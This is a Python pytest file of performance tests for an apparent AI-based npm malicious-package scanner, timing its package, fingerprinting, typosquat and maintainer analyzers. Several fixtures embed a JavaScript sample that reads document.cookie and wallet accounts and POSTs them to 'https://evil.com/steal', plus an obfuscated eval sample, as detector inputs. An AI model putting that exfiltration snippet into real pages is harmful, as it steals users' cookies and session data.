#!/usr/bin/env python3
"""
Performance Tests for AI-Powered NPM Attack Detection

Comprehensive performance testing for all AI detection modules including:
- Response time benchmarks
- Memory usage analysis
- Concurrent processing tests
- Scalability tests
"""

import pytest
import asyncio
import sys
import os
import time
import psutil
import json
from unittest.mock import patch, MagicMock
from pathlib import Path
import statistics

# Add the project root to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from njordscan.ai.ai_package_analyzer import AIPackageAnalyzer
from njordscan.ai.ai_code_fingerprinting import AICodeFingerprinter
from njordscan.ai.package_similarity_analyzer import PackageSimilarityAnalyzer
from njordscan.ai.maintainer_profile_analyzer import MaintainerProfileAnalyzer

class TestAIDetectionPerformance:
    """Performance tests for AI detection modules."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.package_analyzer = AIPackageAnalyzer()
        self.fingerprinter = AICodeFingerprinter()
        self.similarity_analyzer = PackageSimilarityAnalyzer()
        self.maintainer_analyzer = MaintainerProfileAnalyzer()
    
    @pytest.mark.asyncio
    async def test_package_analyzer_performance(self):
        """Test performance of package analyzer."""
        
        # Test with different package sizes
        test_cases = [
            {
                'name': 'small_package',
                'size': '1KB',
                'files': {'index.js': 'console.log("hello");'}
            },
            {
                'name': 'medium_package',
                'size': '10KB',
                'files': {'index.js': 'console.log("hello");' * 1000}
            },
            {
                'name': 'large_package',
                'size': '100KB',
                'files': {'index.js': 'console.log("hello");' * 10000}
            }
        ]
        
        results = {}
        
        for test_case in test_cases:
            package_data = {
                'name': test_case['name'],
                'version': '1.0.0',
                'description': f'Test package - {test_case["size"]}',
                'maintainers': [{'name': 'testuser', 'email': 'test@example.com'}]
            }
            
            # Measure performance
            start_time = time.time()
            start_memory = psutil.Process().memory_info().rss
            
            result = await self.package_analyzer.analyze_package(
                test_case['name'], package_data, test_case['files']
            )
            
            end_time = time.time()
            end_memory = psutil.Process().memory_info().rss
            
            results[test_case['name']] = {
                'execution_time': end_time - start_time,
                'memory_usage': end_memory - start_memory,
                'analysis_time': result.analysis_time
            }
        
        # Verify performance requirements
        for name, metrics in results.items():
            assert metrics['execution_time'] < 5.0, f"{name} took too long: {metrics['execution_time']:.2f}s"
            assert metrics['memory_usage'] < 50 * 1024 * 1024, f"{name} used too much memory: {metrics['memory_usage'] / 1024 / 1024:.2f}MB"
    
    @pytest.mark.asyncio
    async def test_code_fingerprinter_performance(self):
        """Test performance of code fingerprinter."""
        
        # Test with different code complexities
        test_cases = [
            {
                'name': 'simple_code',
                'content': 'console.log("hello");',
                'expected_time': 1.0
            },
            {
                'name': 'complex_code',
                'content': '''
                    // Generated by AI
                    var a1 = function() { return true; };
                    let b2 = (x) => x + 1;
                    const c3 = () => { return "hello"; };
                    
                    function processData() {
                        return "processed";
                    }
                    
                    if (window.ethereum) {
                        window.ethereum.request({method: 'eth_requestAccounts'});
                    }
                    
                    const data = {
                        userAgent: navigator.userAgent,
                        cookies: document.cookie
                    };
                    
                    fetch('https://evil.com/steal', {
                        method: 'POST',
                        body: JSON.stringify(data)
                    });
                ''',
                'expected_time': 2.0
            },
            {
                'name': 'obfuscated_code',
                'content': '''
                    var _0x1234 = String.fromCharCode(72, 101, 108, 108, 111);
                    var _0x5678 = atob("SGVsbG8gV29ybGQ=");
                    var _0x9abc = unescape("%48%65%6c%6c%6f");
                    
                    function _0xdef0() {
                        while (true) {
                            if (Math.random() > 0.5) {
                                break;
                            }
                        }
                    }
                    
                    eval("console.log('hello')");
                ''' * 10,  # Repeat 10 times
                'expected_time': 3.0
            }
        ]
        
        results = {}
        
        for test_case in test_cases:
            start_time = time.time()
            start_memory = psutil.Process().memory_info().rss
            
            result = await self.fingerprinter.analyze_code(
                f"{test_case['name']}.js", test_case['content']
            )
            
            end_time = time.time()
            end_memory = psutil.Process().memory_info().rss
            
            results[test_case['name']] = {
                'execution_time': end_time - start_time,
                'memory_usage': end_memory - start_memory,
                'analysis_time': result.analysis_time
            }
        
        # Verify performance requirements
        for name, metrics in results.items():
            assert metrics['execution_time'] < 5.0, f"{name} took too long: {metrics['execution_time']:.2f}s"
            assert metrics['memory_usage'] < 30 * 1024 * 1024, f"{name} used too much memory: {metrics['memory_usage'] / 1024 / 1024:.2f}MB"
    
    @pytest.mark.asyncio
    async def test_similarity_analyzer_performance(self):
        """Test performance of similarity analyzer."""
        
        # Test with different package names
        test_packages = [
            'react',
            'vue',
            'angular',
            'express',
            'lodash',
            'moment',
            'axios',
            'webpack',
            'babel',
            'typescript'
        ]
        
        results = {}
        
        for package_name in test_packages:
            start_time = time.time()
            start_memory = psutil.Process().memory_info().rss
            
            result = await self.similarity_analyzer.analyze_package_similarity(package_name)
            
            end_time = time.time()
            end_memory = psutil.Process().memory_info().rss
            
            results[package_name] = {
                'execution_time': end_time - start_time,
                'memory_usage': end_memory - start_memory,
                'analysis_time': result.analysis_time
            }
        
        # Verify performance requirements
        for package_name, metrics in results.items():
            assert metrics['execution_time'] < 2.0, f"{package_name} took too long: {metrics['execution_time']:.2f}s"
            assert metrics['memory_usage'] < 20 * 1024 * 1024, f"{package_name} used too much memory: {metrics['memory_usage'] / 1024 / 1024:.2f}MB"
    
    @pytest.mark.asyncio
    async def test_maintainer_analyzer_performance(self):
        """Test performance of maintainer analyzer."""
        
        # Test with different maintainer profiles
        test_maintainers = [
            {
                'name': 'legitimateuser',
                'email': 'legitimate@example.com',
                'account_created': '2020-01-01T00:00:00Z',
                'total_packages': 5
            },
            {
                'name': 'a1b2c3',
                'email': 'a1b2c3@gmail.com',
                'account_created': '2024-01-01T00:00:00Z',
                'total_packages': 15
            },
            {
                'name': 'suspicioususer',
                'email': 'suspicious@temp-mail.org',
                'account_created': '2024-01-01T00:00:00Z',
                'total_packages': 20,
                'recent_activity': [
                    {'date': '2024-01-01T00:00:00Z', 'action': 'create'},
                    {'date': '2024-01-02T00:00:00Z', 'action': 'update'},
                    {'date': '2024-01-03T00:00:00Z', 'action': 'create'},
                    {'date': '2024-01-04T00:00:00Z', 'action': 'update'},
                    {'date': '2024-01-05T00:00:00Z', 'action': 'create'},
                    {'date': '2024-01-06T00:00:00Z', 'action': 'update'},
                ]
            }
        ]
        
        results = {}
        
        for maintainer_data in test_maintainers:
            start_time = time.time()
            start_memory = psutil.Process().memory_info().rss
            
            result = await self.maintainer_analyzer.analyze_maintainer(maintainer_data)
            
            end_time = time.time()
            end_memory = psutil.Process().memory_info().rss
            
            results[maintainer_data['name']] = {
                'execution_time': end_time - start_time,
                'memory_usage': end_memory - start_memory,
                'analysis_time': result.maintainer.analysis_time
            }
        
        # Verify performance requirements
        for maintainer_name, metrics in results.items():
            assert metrics['execution_time'] < 1.0, f"{maintainer_name} took too long: {metrics['execution_time']:.2f}s"
            assert metrics['memory_usage'] < 10 * 1024 * 1024, f"{maintainer_name} used too much memory: {metrics['memory_usage'] / 1024 / 1024:.2f}MB"
    
    @pytest.mark.asyncio
    async def test_concurrent_analysis_performance(self):
        """Test performance of concurrent analysis."""
        
        # Create test data
        packages = []
        for i in range(10):
            package_data = {
                'name': f'package-{i}',
                'version': '1.0.0',
                'description': f'Test package {i}',
                'maintainers': [{'name': f'user{i}', 'email': f'user{i}@example.com'}]
            }
            
            package_files = {
                'index.js': f'console.log("hello from package {i}");'
            }
            
            packages.append((package_data, package_files))
        
        # Test concurrent analysis
        start_time = time.time()
        start_memory = psutil.Process().memory_info().rss
        
        tasks = []
        for package_data, package_files in packages:
            task = self.package_analyzer.analyze_package(
                package_data['name'], package_data, package_files
            )
            tasks.append(task)
        
        results = await asyncio.gather(*tasks)
        
        end_time = time.time()
        end_memory = psutil.Process().memory_info().rss
        
        # Verify performance
        total_time = end_time - start_time
        memory_usage = end_memory - start_memory
        
        assert total_time < 10.0, f"Concurrent analysis took too long: {total_time:.2f}s"
        assert memory_usage < 100 * 1024 * 1024, f"Concurrent analysis used too much memory: {memory_usage / 1024 / 1024:.2f}MB"
        
        # Verify all analyses completed
        assert len(results) == 10
        for result in results:
            assert result is not None
    
    @pytest.mark.asyncio
    async def test_memory_usage_under_load(self):
        """Test memory usage under load."""
        
        # Create large test data
        large_code = '''
            // Generated by AI
            var a1 = function() { return true; };
            let b2 = (x) => x + 1;
            const c3 = () => { return "hello"; };
            
            function processData() {
                return "processed";
            }
            
            if (window.ethereum) {
                window.ethereum.request({method: 'eth_requestAccounts'});
            }
            
            const data = {
                userAgent: navigator.userAgent,
                cookies: document.cookie
            };
            
            fetch('https://evil.com/steal', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        ''' * 1000  # Large code
        
        package_data = {
            'name': 'large-package',
            'version': '1.0.0',
            'description': 'Large package for memory testing',
            'maintainers': [{'name': 'testuser', 'email': 'test@example.com'}]
        }
        
        package_files = {
            'index.js': large_code,
            'package.json': json.dumps(package_data)
        }
        
        # Run multiple analyses to test memory usage
        initial_memory = psutil.Process().memory_info().rss
        max_memory = initial_memory
        
        for i in range(20):  # Run 20 analyses
            result = await self.package_analyzer.analyze_package(
                f'package-{i}', package_data, package_files
            )
            
            current_memory = psutil.Process().memory_info().rss
            max_memory = max(max_memory, current_memory)
            
            # Check for memory leaks (memory shouldn't grow indefinitely)
            if i > 5:  # After a few iterations
                memory_growth = current_memory - initial_memory
                assert memory_growth < 200 * 1024 * 1024, f"Memory leak detected: {memory_growth / 1024 / 1024:.2f}MB growth"
        
        # Verify final memory usage
        final_memory = psutil.Process().memory_info().rss
        total_memory_usage = final_memory - initial_memory
        
        assert total_memory_usage < 500 * 1024 * 1024, f"Total memory usage too high: {total_memory_usage / 1024 / 1024:.2f}MB"
    
    @pytest.mark.asyncio
    async def test_scalability_with_many_packages(self):
        """Test scalability with many packages."""
        
        # Test with increasing number of packages
        package_counts = [1, 5, 10, 20, 50]
        results = {}
        
        for count in package_counts:
            packages = []
            for i in range(count):
                package_data = {
                    'name': f'package-{i}',
                    'version': '1.0.0',
                    'description': f'Test package {i}',
                    'maintainers': [{'name': f'user{i}', 'email': f'user{i}@example.com'}]
                }
                
                package_files = {
                    'index.js': f'console.log("hello from package {i}");'
                }
                
                packages.append((package_data, package_files))
            
            # Measure performance
            start_time = time.time()
            
            tasks = []
            for package_data, package_files in packages:
                task = self.package_analyzer.analyze_package(
                    package_data['name'], package_data, package_files
                )
                tasks.append(task)
            
            await asyncio.gather(*tasks)
            
            end_time = time.time()
            total_time = end_time - start_time
            
            results[count] = {
                'total_time': total_time,
                'avg_time_per_package': total_time / count
            }
        
        # Verify scalability (time per package should not increase dramatically)
        avg_times = [results[count]['avg_time_per_package'] for count in package_counts]

        # The average time per package should not increase by more than 5x
        # (allowing for some variance with small numbers)
        max_avg_time = max(avg_times)
        min_avg_time = min(avg_times)

        assert max_avg_time / min_avg_time < 5.0, f"Scalability issue: max time {max_avg_time:.2f}s, min time {min_avg_time:.2f}s"
    
    @pytest.mark.asyncio
    async def test_error_handling_performance(self):
        """Test performance with error conditions."""
        
        # Test with various error conditions
        error_cases = [
            {
                'name': 'empty_package',
                'data': {},
                'files': {}
            },
            {
                'name': 'invalid_json',
                'data': {'name': 'test'},
                'files': {'package.json': 'invalid json'}
            },
            {
                'name': 'none_content',
                'data': {'name': 'test'},
                'files': {'index.js': None}
            },
            {
                'name': 'very_large_content',
                'data': {'name': 'test'},
                'files': {'index.js': 'x' * (10 * 1024 * 1024)}  # 10MB
            }
        ]
        
        results = {}
        
        for error_case in error_cases:
            start_time = time.time()
            
            try:
                result = await self.package_analyzer.analyze_package(
                    error_case['name'], error_case['data'], error_case['files']
                )
            except Exception as e:
                result = None
            
            end_time = time.time()
            
            results[error_case['name']] = {
                'execution_time': end_time - start_time,
                'success': result is not None
            }
        
        # Verify performance (should handle errors quickly)
        for case_name, metrics in results.items():
            if case_name == 'very_large_content':
                # Large content takes longer to process
                assert metrics['execution_time'] < 5.0, f"{case_name} took too long: {metrics['execution_time']:.2f}s"
            else:
                assert metrics['execution_time'] < 2.0, f"{case_name} took too long: {metrics['execution_time']:.2f}s"
    
    def test_statistics_performance(self):
        """Test performance of statistics collection."""
        
        # Test statistics collection performance
        start_time = time.time()
        
        # Get statistics multiple times
        for _ in range(1000):
            stats = self.package_analyzer.get_statistics()
            assert isinstance(stats, dict)
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Statistics collection should be very fast
        assert total_time < 1.0, f"Statistics collection too slow: {total_time:.2f}s"
    
    @pytest.mark.asyncio
    async def test_benchmark_comparison(self):
        """Benchmark comparison between different analyzers."""
        
        # Test data
        package_data = {
            'name': 'benchmark-package',
            'version': '1.0.0',
            'description': 'Benchmark test package',
            'maintainers': [{'name': 'testuser', 'email': 'test@example.com'}]
        }
        
        package_files = {
            'index.js': '''
                // Generated by AI
                var a1 = function() { return true; };
                
                if (window.ethereum) {
                    window.ethereum.request({method: 'eth_requestAccounts'});
                }
                
                const data = {
                    userAgent: navigator.userAgent,
                    cookies: document.cookie
                };
                
                fetch('https://evil.com/steal', {
                    method: 'POST',
                    body: JSON.stringify(data)
                });
            '''
        }
        
        # Benchmark each analyzer
        analyzers = {
            'package_analyzer': self.package_analyzer.analyze_package,
            'fingerprinter': self.fingerprinter.analyze_code,
            'similarity_analyzer': self.similarity_analyzer.analyze_package_similarity,
            'maintainer_analyzer': self.maintainer_analyzer.analyze_maintainer
        }
        
        results = {}
        
        for name, analyzer_func in analyzers.items():
            times = []
            
            # Run multiple times for accurate measurement
            for _ in range(10):
                start_time = time.time()
                
                if name == 'package_analyzer':
                    await analyzer_func('benchmark-package', package_data, package_files)
                elif name == 'fingerprinter':
                    await analyzer_func('index.js', package_files['index.js'])
                elif name == 'similarity_analyzer':
                    await analyzer_func('benchmark-package')
                elif name == 'maintainer_analyzer':
                    await analyzer_func(package_data)
                
                end_time = time.time()
                times.append(end_time - start_time)
            
            results[name] = {
                'avg_time': statistics.mean(times),
                'min_time': min(times),
                'max_time': max(times),
                'std_dev': statistics.stdev(times) if len(times) > 1 else 0
            }
        
        # Verify all analyzers perform within acceptable limits
        for name, metrics in results.items():
            assert metrics['avg_time'] < 5.0, f"{name} average time too high: {metrics['avg_time']:.2f}s"
            assert metrics['max_time'] < 10.0, f"{name} max time too high: {metrics['max_time']:.2f}s"

if __name__ == '__main__':
    pytest.main([__file__, '-v'])
